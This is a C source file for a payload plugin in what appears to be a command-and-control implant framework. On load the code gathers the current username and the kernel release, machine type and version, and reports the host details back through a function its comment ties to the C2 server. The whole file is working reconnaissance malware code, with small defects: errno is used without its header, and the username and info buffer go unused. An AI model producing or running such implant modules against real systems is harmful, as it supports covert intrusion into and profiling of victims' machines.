#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/utsname.h>
#include <time.h>

#include "../OutputFormatter.h" // Required!

typedef void(*output_func)(int, const char* fmt, ...); // For printing output on C2 server.

int payload_init(int id, output_func output) {

    srand(time(NULL));
    int randInt = rand() % 100000 + 30000;

    sleep(5);

    // Get username.
    char* username = getlogin();

    // Get computer information.
    struct utsname buffer;
    if (uname(&buffer) < 0) {
        output(id, "Failed to get uname information! Error code: %d\n", errno);
        return 1; 
    }

    // Put all together.
    int infoSize = 65*3;
    char info[infoSize];

    snprintf(info, infoSize, "%d %s %s %s", randInt, buffer.release, buffer.machine, buffer.version); // From OutputFormatter.h

    output(id, "%d %s %s %s\n", randInt, buffer.release, buffer.machine, buffer.version);
    output(id, "Oh yeah, also...\n");
    return 0;
}
